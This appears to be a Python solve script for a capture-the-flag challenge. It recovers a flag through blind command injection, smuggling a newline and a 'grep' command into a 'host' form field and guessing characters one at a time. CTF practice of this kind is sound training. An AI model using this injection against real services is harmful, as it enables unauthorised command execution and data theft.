import requests
import string

flag = "flag."
url = "http://challenge.ctf.games:30669/"

# Each time a successful login is seen, restart loop
restart = True

while restart:
    restart = False
    # Loop through chars
    for i in string.ascii_lowercase + string.digits:
        payload = flag + i
        post_data = {'host': '127.0.0.1\x0Agrep ' + payload + ' flag.txt'}
        r = requests.post(url, data=post_data)
        # Correct char results in "successful password"
        if 'Success' in r.text:
            print(payload.replace('.', '{'))
            restart = True
            flag = payload
            # Exit if we have flag{32-hex
            if len(flag) == 37:
                print('\nFlag: ' + flag.replace('.', '{') + '}')
                exit(0)
            break
